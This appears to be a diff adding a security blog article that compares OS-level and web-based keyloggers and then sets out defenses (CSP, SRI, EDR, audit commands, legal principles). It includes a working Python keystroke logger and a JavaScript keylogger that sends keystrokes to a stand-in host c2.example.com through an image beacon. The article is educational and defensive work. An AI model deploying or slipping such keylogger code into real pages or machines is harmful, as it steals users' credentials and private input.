@@ -1,0 +1,463 @@
+<div class="box warning">
+
+<strong>
+Educational Disclaimer
+</strong>
+
+<p>
+This article is intended for authorized security assessments, penetration testing, and defensive education only. All techniques described below are demonstrated in authorized environments with proper legal consent. Unauthorized deployment of keyloggers is illegal in most jurisdictions. The author does not support or encourage any unauthorized access to systems or data.
+</p>
+
+</div>
+
+<h2>The Silent Witness: OS-Level vs. Web-Based Keyloggers</h2>
+
+<p>
+When most people imagine a keylogger, they picture a shadowy piece of malware silently recording every password, message, and credit card number typed into a computer. That image is accurate — but only half the story.
+</p>
+
+<p>
+The reality is that keyloggers come in two fundamentally different flavors: <strong>OS-level</strong> and <strong>web-based</strong>. They operate at completely different layers of the stack, with different capabilities, different persistence mechanisms, and — most importantly — different defenses.
+</p>
+
+<p>
+This article breaks down both approaches, compares them head-to-head, and provides actionable defenses for blue teams and individuals alike.
+</p>
+
+<hr>
+
+<h2>1. OS-Level Keyloggers: The Full-Capture Beast</h2>
+
+<p>
+<strong>What it is:</strong> An OS-level keylogger hooks directly into the operating system's input handling pipeline. It captures <strong>every keystroke</strong> regardless of which application has focus — browser, terminal, password manager, VPN client, everything.
+</p>
+
+<p>
+<strong>How it works at the system level:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Windows:</strong> Uses <code>SetWindowsHookEx</code> with <code>WH_KEYBOARD_LL</code> (low-level keyboard hook) or a kernel-mode driver that intercepts IRP (I/O Request Packet) handlers.
+</li>
+<li>
+<strong>Linux:</strong> Reads directly from <code>/dev/input/event*</code> devices or uses <code>libevdev</code> to capture input events before they reach user space.
+</li>
+<li>
+<strong>macOS:</strong> Uses <code>CGEventTap</code> (Quartz Event Services) at the Core Graphics level or <code>IOKit</code> HID drivers for kernel-level capture.
+</li>
+</ul>
+
+<div class="box job">
+
+<strong>Proof of Concept — Python (Cross-Platform):</strong>
+
+<p>
+from pynput import keyboard
+</p>
+<p>
+def on_press(key):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;try:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open("captures.log", "a") as f:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(f"{key.char}")<br>
+&nbsp;&nbsp;&nbsp;&nbsp;except AttributeError:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open("captures.log", "a") as f:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(f"[{key.name.upper()}]")
+</p>
+<p>
+with keyboard.Listener(on_press=on_press) as listener:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;listener.join()
+</p>
+
+<p>
+<strong>Capabilities:</strong><br>
+• Captures ALL keystrokes system-wide<br>
+• Runs as a background process (hidden)<br>
+• Survives reboot via Registry / cron / LaunchDaemon<br>
+• Can exfiltrate via encrypted C2, DNS tunneling, or SMTP
+</p>
+
+</div>
+
+<p>
+<strong>What an attacker achieves:</strong> Complete credential harvesting across all applications. Passwords typed into browsers, terminal sessions, password managers, RDP clients, and VPNs are all captured indiscriminately.
+</p>
+
+<hr>
+
+<h2>2. Web-Based Keyloggers: The Sandboxed Spy</h2>
+
+<p>
+<strong>What it is:</strong> A web-based keylogger operates entirely within the browser's security sandbox. It cannot capture keystrokes outside the browser, cannot access the filesystem, and cannot install OS-level persistence. But it is significantly easier to deploy — delivered via a single URL, XSS payload, or compromised webpage.
+</p>
+
+<p>
+<strong>How it works at the browser level:</strong>
+</p>
+
+<ul>
+<li>
+<strong>JavaScript keydown/keyup events:</strong> Attach event listeners to the document that capture every keystroke typed into form fields, search bars, and chat windows within the page.
+</li>
+<li>
+<strong>CSS attribute exfiltration:</strong> Use <code>input[value^="a"] { background: url(/leak?p=a); }</code> to leak password field values character-by-character — no JavaScript required. This bypasses some CSP policies.
+</li>
+<li>
+<strong>Service Worker injection:</strong> Register a Service Worker that re-injects the logger into every page the victim navigates to on the same origin, surviving page loads without re-exploitation.
+</li>
+<li>
+<strong>Exfiltration via image beacon:</strong> Data is sent to a C2 server using <code>new Image().src = ...</code> or <code>navigator.sendBeacon()</code> — both stealthy and hard to distinguish from normal web traffic.
+</li>
+</ul>
+
+<div class="box job">
+
+<strong>Proof of Concept — JavaScript Keylogger:</strong>
+
+<p>
+let buffer = [];
+</p>
+<p>
+document.addEventListener('keydown', function(e) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;const key = e.key;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;const field = e.target.name || 'unknown';<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;buffer.push({ t: Date.now(), k: key, f: field });<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;// Exfiltrate via image beacon<br>
+&nbsp;&nbsp;&nbsp;&nbsp;new Image().src = 'https://c2.example.com/collect?d=' +<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;btoa(JSON.stringify({ k: key, f: field }));<br>
+});
+</p>
+
+<p>
+<strong>Capabilities:</strong><br>
+• Captures keystrokes only within the browser tab<br>
+• No binary — delivered via URL or XSS injection<br>
+• Cross-platform (any browser, any OS)<br>
+• Can survive same-origin navigation via Service Workers
+</p>
+
+</div>
+
+<p>
+<strong>What an attacker achieves:</strong> Harvesting of credentials entered into web forms — login pages, payment forms, search queries, and chat messages. Combined with session hijacking, this can yield full account takeover even when MFA is present (by capturing the OTP as it is typed).
+</p>
+
+<hr>
+
+<h2>3. The Critical Differences at a Glance</h2>
+
+<p>
+<strong>What it is:</strong> These two approaches operate at fundamentally different layers of the technology stack. Understanding the gap between them is essential for building realistic threat models and deploying appropriate defenses.
+</p>
+
+<div class="box job">
+
+<strong>Comparison Table:</strong>
+
+<p>
+<strong>Capture Scope:</strong><br>
+• OS-Level: All keystrokes system-wide (browser, terminal, password manager, VPN)<br>
+• Web-Based: Only within the browser tab where the payload executes
+</p>
+
+<p>
+<strong>Persistence:</strong><br>
+• OS-Level: Registry, cron, LaunchDaemon — survives reboot<br>
+• Web-Based: Service Worker (same-origin only, limited survival)
+</p>
+
+<p>
+<strong>Stealth:</strong><br>
+• OS-Level: Highly stealthy — kernel hooks, process hollowing, rootkit hiding<br>
+• Web-Based: Low stealth — visible in DevTools, detectable via CSP/SRI
+</p>
+
+<p>
+<strong>Privilege Required:</strong><br>
+• OS-Level: User-level minimum; SYSTEM for maximum stealth<br>
+• Web-Based: None — runs entirely in browser sandbox
+</p>
+
+<p>
+<strong>Deployment Method:</strong><br>
+• OS-Level: Requires executable delivery (phishing attachment, USB drop, exploit kit)<br>
+• Web-Based: Delivered via URL (XSS, watering hole, compromised CDN)
+</p>
+
+<p>
+<strong>Detectability:</strong><br>
+• OS-Level: High difficulty — EDR bypass, DKOM, rootkits<br>
+• Web-Based: Low difficulty — CSP, SRI, DevTools auditing
+</p>
+
+<p>
+<strong>Evades EDR/AV?</strong><br>
+• OS-Level: Possibly — depends on implementation and privilege level<br>
+• Web-Based: Yes — no binary to scan
+</p>
+
+<p>
+<strong>Forensic Footprint:</strong><br>
+• OS-Level: Binary on disk, driver load, process list entries<br>
+• Web-Based: Network logs, SW cache, IndexedDB artifacts
+</p>
+
+</div>
+
+<hr>
+
+<h2>4. How to Protect Yourself: Defenses for Individuals and Organizations</h2>
+
+<p>
+<strong>What it is:</strong> Defending against keyloggers requires a layered approach. No single control stops both OS-level and web-based variants. The following recommendations cover both attack surfaces.
+</p>
+
+<h3>4.1 Defenses Against OS-Level Keyloggers</h3>
+
+<p>
+<strong>Endpoint Detection and Response (EDR):</strong> Modern EDR solutions monitor for <code>SetWindowsHookEx</code> API calls (Sysmon Event ID 8), unusual <code>/dev/input/event*</code> readers on Linux, and suspicious <code>CGEventTap</code> registrations on macOS. Deploy EDR on all managed endpoints.
+</p>
+
+<p>
+<strong>Application Control (Allowlisting):</strong> Windows AppLocker or WDAC (Windows Defender Application Control) can block unauthorized executables from running — including keylogger binaries delivered via phishing. Linux users can enforce SELinux or AppArmor policies.
+</p>
+
+<p>
+<strong>Driver Signature Enforcement:</strong> On Windows, enable Secure Boot and Driver Signature Enforcement to block unsigned kernel-mode drivers. This prevents rootkit-level keyloggers from loading.
+</p>
+
+<p>
+<strong>Regular Auditing:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Windows:</strong> Run <code>driverquery /v | findstr -i keyboard</code> to check for suspicious keyboard drivers. Review running processes with <code>tasklist /v</code> for renamed/masqueraded processes.
+</li>
+<li>
+<strong>Linux:</strong> Run <code>fuser /dev/input/event*</code> to see which processes are reading input devices. Check <code>lsof | grep /dev/input</code> for unexpected readers. Review <code>systemctl list-units</code> for unknown services.
+</li>
+<li>
+<strong>macOS:</strong> Check <code>launchctl list</code> for suspicious LaunchAgents. Review <code>kextstat | grep -v com.apple</code> for third-party kernel extensions.
+</li>
+</ul>
+
+<p>
+<strong>Password Managers with Auto-Fill:</strong> Using a password manager that auto-fills credentials without typing them (using browser extension APIs rather than simulating keystrokes) defeats OS-level keyloggers entirely. The password never passes through the keyboard input stack.
+</p>
+
+<p>
+<strong>Two-Factor Authentication (MFA):</strong> Even if credentials are captured, MFA provides a second layer of defense. Hardware tokens (YubiKey) or app-based TOTP are preferred over SMS, which can be intercepted. Note: OTP codes typed into a login form are still captured — use push-based MFA or WebAuthn where possible.
+</p>
+
+<h3>4.2 Defenses Against Web-Based Keyloggers</h3>
+
+<p>
+<strong>Content Security Policy (CSP):</strong> This is the single most effective defense against web-based keyloggers. A properly configured CSP blocks inline scripts, restricts image sources (preventing beacon exfiltration), and limits connect-src (preventing sendBeacon and WebSocket leaks).
+</p>
+
+<div class="box job">
+
+<strong>CSP Header — Blocks Web-Based Keyloggers:</strong>
+
+<p>
+Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'; connect-src 'self'; worker-src 'self';
+</p>
+
+<p>
+<strong>What this blocks:</strong><br>
+• Inline JavaScript keyloggers (requires 'unsafe-inline' which should be avoided)<br>
+• Image beacons to external C2 servers<br>
+• sendBeacon to external origins<br>
+• Service Workers from external domains<br>
+• CSS attribute-based exfiltration (if img-src is restricted)
+</p>
+
+</div>
+
+<p>
+<strong>Subresource Integrity (SRI):</strong> Every script and stylesheet loaded from a CDN should include an <code>integrity</code> hash. If the CDN is compromised and the keylogger is injected into a library, SRI causes the browser to reject the modified file.
+</p>
+
+<div class="box job">
+
+<strong>SRI Example:</strong>
+
+<p>
+&lt;script src="https://cdn.example.com/app.js"<br>
+&nbsp;&nbsp;&nbsp;&nbsp;integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"<br>
+&nbsp;&nbsp;&nbsp;&nbsp;crossorigin="anonymous"&gt;&lt;/script&gt;
+</p>
+
+</div>
+
+<p>
+<strong>Trusted Types (CSP Enforcement):</strong> Trusted Types is a browser API that prevents DOM XSS by restricting the sources of strings passed to dangerous sinks like <code>innerHTML</code>. This stops keylogger injection via DOM-based XSS.
+</p>
+
+<div class="box job">
+
+<strong>Trusted Types Header:</strong>
+
+<p>
+Content-Security-Policy: require-trusted-types-for 'script'
+</p>
+
+</div>
+
+<p>
+<strong>Service Worker Monitoring:</strong> Browsers allow users to inspect registered Service Workers.
+</p>
+
+<ul>
+<li>
+<strong>Chrome:</strong> Navigate to <code>chrome://serviceworker-internals/</code> to view all registered Service Workers. Unregister any that are unexpected.
+</li>
+<li>
+<strong>Firefox:</strong> Navigate to <code>about:debugging#/runtime/this-firefox</code> and check the Service Workers section.
+</li>
+<li>
+<strong>Programmatic check:</strong> Run the following in the browser console:<br>
+<code>navigator.serviceWorker.getRegistrations().then(regs => regs.forEach(r => r.unregister()));</code>
+</li>
+</ul>
+
+<p>
+<strong>Browser Extensions for Keylogging Detection:</strong> Security extensions like NoScript, uBlock Origin, and ScriptSafe can block third-party scripts and inline JavaScript by default, preventing web-based keyloggers from executing unless explicitly whitelisted.
+</p>
+
+<p>
+<strong>Disable Autofill for Sensitive Fields:</strong> While password managers with auto-fill are recommended against OS-level keyloggers, disabling browser-based autofill for credit card numbers and personal information prevents form-harvesting scripts from reading stored values.
+</p>
+
+<h3>4.3 Universal Defenses (Both Types)</h3>
+
+<p>
+<strong>Principle of Least Privilege:</strong> Run with the minimum privileges necessary. A keylogger running as a standard user cannot install kernel drivers, write to system directories, or survive across user sessions. On Windows, never run as Administrator for daily use.
+</p>
+
+<p>
+<strong>Keep Software Updated:</strong> OS vendors patch kernel-level vulnerabilities that keyloggers exploit. Browser vendors patch XSS vectors, CSP bypasses, and Service Worker vulnerabilities. Regularly apply updates.
+</p>
+
+<p>
+<strong>Network Segmentation and Egress Filtering:</strong> Keyloggers are useless if they cannot exfiltrate data. Block outbound connections to unknown IP addresses and domains at the network perimeter. Use DNS filtering to block connections to known C2 infrastructure.
+</p>
+
+<p>
+<strong>User Awareness Training:</strong> Train users to:
+</p>
+
+<ul>
+<li>
+Recognize phishing emails that deliver keylogger executables
+</li>
+<li>
+Verify website URLs before entering credentials
+</li>
+<li>
+Report unexpected browser behavior (pop-ups, redirects, slow performance)
+</li>
+<li>
+Avoid downloading software from untrusted sources
+</li>
+</ul>
+
+<p>
+<strong>Regular Security Assessments:</strong> Run internal penetration tests that specifically test for keylogging vulnerabilities — both on endpoints (OS-level) and in web applications (XSS-based). Use the results to close gaps before attackers find them.
+</p>
+
+<hr>
+
+<h2>5. Putting It All Together: A Realistic Defense Triage</h2>
+
+<p>
+During an internal security assessment, the defense workflow looks like this:
+</p>
+
+<ul>
+<li>
+<strong>Step 1 — CSP audit:</strong> Does the web application have a restrictive Content Security Policy? If not, it is vulnerable to web-based keyloggers via XSS. Prioritize implementing CSP <code>script-src 'self'; img-src 'self'; connect-src 'self'</code> with nonces.
+</li>
+<li>
+<strong>Step 2 — EDR deployment check:</strong> Are all endpoints covered by EDR that monitors for keyboard hook APIs and unusual <code>/dev/input</code> readers? If not, deploy or configure detection rules.
+</li>
+<li>
+<strong>Step 3 — Application control audit:</strong> Is AppLocker or WDAC enforced on Windows endpoints? If not, unauthorized executables — including keyloggers — can run freely.
+</li>
+<li>
+<strong>Step 4 — Password manager deployment:</strong> Are users using password managers with auto-fill? If not, implement one. This single control defeats OS-level keyloggers entirely for credential capture.
+</li>
+<li>
+<strong>Step 5 — MFA enforcement:</strong> Is MFA enforced for all critical systems? Even if credentials are captured, MFA provides a safety net. Prefer hardware tokens or push-based MFA over SMS.
+</li>
+<li>
+<strong>Step 6 — Network egress filtering:</strong> Are outbound connections restricted to approved domains and IP ranges? If not, keyloggers can easily phone home to C2 servers.
+</li>
+<li>
+<strong>Step 7 — Service Worker audit:</strong> Check for unexpected Service Workers on production web applications. Unregister any that are not part of the approved codebase.
+</li>
+<li>
+<strong>Step 8 — User awareness:</strong> Run a simulated phishing campaign with a keylogger payload scenario. Measure click rates and retrain users who fall for it.
+</li>
+</ul>
+
+<hr>
+
+<h2>6. The Legal and Ethical Framework</h2>
+
+<p>
+<strong>What it is:</strong> Every discussion of keyloggers — both offensive and defensive — operates within a strict legal and ethical boundary. Understanding this boundary is essential for any security professional.
+</p>
+
+<p>
+<strong>The key principles:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Authorization:</strong> Deploying a keylogger on any system requires explicit, documented authorization. In penetration testing, this means a signed Statement of Work defining the scope of testing. Without it, deploying a keylogger is a criminal act — unauthorized computer access, wiretapping, and identity theft in most jurisdictions.
+</li>
+<li>
+<strong>Scope limitation:</strong> Even with authorization, keyloggers must be deployed only against in-scope targets. Capturing credentials for out-of-scope systems (personal email, social media, banking) introduces legal liability even within an authorized test.
+</li>
+<li>
+<strong>Data handling:</strong> Captured keystrokes may contain sensitive personal information. Forensic examiners and penetration testers must handle this data with appropriate encryption, access controls, and retention policies. Data minimization applies — collect only what is needed for the assessment.
+</li>
+<li>
+<strong>Disclosure:</strong> If a keylogger is discovered during an authorized test, it must be disclosed to the client immediately — including the data captured, how far it spread, and the remediation steps needed.
+</li>
+<li>
+<strong>Defensive testing:</strong> Running these techniques against your own infrastructure for defensive validation is legal and encouraged. Running them against third parties without authorization is not.
+</li>
+</ul>
+
+<hr>
+
+<h2>Final Thoughts</h2>
+
+<p>
+Keyloggers remain one of the most reliable tools in an attacker's arsenal — and one of the most misunderstood by defenders. The distinction between OS-level and web-based variants is not academic; it determines which defenses work and which fail.
+</p>
+
+<p>
+<strong>OS-level keyloggers are the heavyweight.</strong> They capture everything, persist through reboots, and hide from casual inspection. Defeating them requires endpoint protection, application control, and — most effectively — removing the value of the capture by using password managers with auto-fill and hardware-backed MFA.
+</p>
+
+<p>
+<strong>Web-based keyloggers are the opportunist.</strong> They are limited to the browser sandbox but are trivially deployable via XSS or compromised third-party scripts. Defeating them requires Content Security Policy, Subresource Integrity, and Trusted Types — controls that are often overlooked in web application security.
+</p>
+
+<p>
+<strong>The defense mindset is everything.</strong> For penetration testers, understanding both approaches allows you to test realistically across the full attack surface. For defenders, it closes the gaps that exist at every layer — from the kernel driver to the JavaScript engine.
+</p>
+
+<p>
+<strong>If you are responsible for organizational security</strong>, the recommendation is straightforward: deploy EDR with keyboard hook monitoring, enforce CSP with strict script and image source restrictions, enable AppLocker or WDAC, mandate password managers, and train your users. These few layers close the vast majority of keylogger attack paths — both OS-level and web-based.
+</p>
+
+<p>
+Stay sharp. Test thoroughly. Defend every layer.
+</p>
